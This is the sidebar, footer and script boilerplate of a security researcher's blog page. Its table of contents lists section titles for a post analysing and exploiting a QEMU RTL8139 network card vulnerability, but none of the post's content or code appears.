          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/uploads/avatar.webp" alt="Ke Liu">
          <p class="site-author-name" itemprop="name">Ke Liu</p>
           
              <p class="site-description motion-element" itemprop="description">Independent Security Researcher</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">22</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">17</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">60</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/klotxl404" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                    
                      Twitter
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境搭建"><span class="nav-text">0x01. 环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-宿主机创建"><span class="nav-text">1.1 宿主机创建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-QEMU-编译"><span class="nav-text">1.2 QEMU 编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-虚拟机创建"><span class="nav-text">1.3 虚拟机创建</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-内存映射"><span class="nav-text">0x02. 内存映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞分析"><span class="nav-text">0x03. 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-漏洞简介"><span class="nav-text">3.1 漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-基础知识"><span class="nav-text">3.2 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-Ethernet-Frame-Format"><span class="nav-text">3.2.1 Ethernet Frame Format</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-IP-Packet-Format"><span class="nav-text">3.2.2 IP Packet Format</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-3-TCP-Segment-Format"><span class="nav-text">3.2.3 TCP Segment Format</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-漏洞分析"><span class="nav-text">3.3 漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-漏洞利用"><span class="nav-text">0x04 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-RTL8139-网卡简介"><span class="nav-text">4.1 RTL8139 网卡简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-Port-Mapped-I-O"><span class="nav-text">4.2 Port Mapped I/O</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-PMIO-读写"><span class="nav-text">4.3 PMIO 读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-漏洞触发"><span class="nav-text">4.4 漏洞触发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-漏洞利用"><span class="nav-text">4.5 漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-分析小结"><span class="nav-text">0x05. 分析小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-参考文献"><span class="nav-text">0x06. 参考文献</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy;  2010 - 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ke Liu</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
